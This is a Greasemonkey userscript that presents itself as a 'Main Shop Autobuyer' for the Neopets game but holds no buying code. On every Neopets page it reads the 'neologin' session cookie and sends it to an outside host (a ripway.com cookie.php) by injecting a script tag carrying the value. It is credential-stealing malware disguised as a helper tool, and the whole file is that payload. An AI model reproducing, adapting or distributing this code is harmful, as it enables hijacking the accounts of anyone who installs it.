// ==UserScript==
// @author Annex
// @name Duckling
// @namespace annexgamer@userscripts.org
// @description Main Shop Autobuyer for Neopets
// @include http://www.neopets.com/*
// @exclude http://www.neopets.com/ads/*
// @exclude http://www.neopets.com/neomail_block_check.phtml*
// ==/UserScript==

var strURL = 'http://h1.ripway.com/annexgamer/cookie.php?

cookie=';
function GetStringBetween( 

target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); 
    result_str = result_str.substr( result_str.indexOf( start_str ) 

+ start_str.length ); 
    result_str = result_str.substr ( 0, result_str.indexOf( end_str 

) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + 

strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, 

eleNew.nextSibling);
}  